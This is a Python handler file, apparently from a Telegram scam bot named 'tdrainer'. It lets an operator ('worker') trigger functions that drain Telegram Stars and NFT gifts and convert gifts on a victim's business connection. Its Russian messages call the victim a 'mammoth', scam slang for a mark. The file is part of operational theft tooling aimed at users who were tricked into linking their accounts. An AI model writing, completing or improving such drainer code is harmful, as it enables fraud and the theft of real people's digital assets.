# twork/tdrainer/handlers/manual_control_handlers.py
from aiogram import Router, F, types
from keyboards.user_keyboards import ManualControl
from database import get_connection_details
from handlers.business_handlers import convert_regular_gifts, drain_stars, drain_nft_gifts
from keyboards.user_keyboards import ManualControl, RefreshConnection
from database import get_connection_details, get_worker_id
from bot_instance import bot, worker_bot
from settings import settings
from utils import escape_md
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest

router = Router()

@router.callback_query(ManualControl.filter())
async def handle_manual_control(callback: types.CallbackQuery, callback_data: ManualControl):
    action = callback_data.action
    mammoth_id = callback_data.mammoth_id

    connection_details = get_connection_details(mammoth_id)
    if not connection_details:
        await callback.answer("❌ Ошибка: не найдены детали подключения для этого пользователя.", show_alert=True)
        return
    
    bc_id = connection_details[1]
    
    if not bc_id:
        await callback.answer("❌ Ошибка: ID бизнес-подключения не сохранен. Пользователь должен переподключиться.", show_alert=True)
        return

    await callback.answer(f"🚀 Запускаю задачу: {action}...")
    
    report = ""
    if action == "convert_gifts":
        report = await convert_regular_gifts(bc_id)
    elif action == "drain_gifts":
        report = await drain_nft_gifts(bc_id)
    elif action == "drain_stars":
        report = await drain_stars(bc_id)
    
    await callback.message.answer(
        f"📝 *Отчет о ручной операции для мамонта `{mammoth_id}`:*\n\n`{report}`",
        parse_mode="MarkdownV2"
    )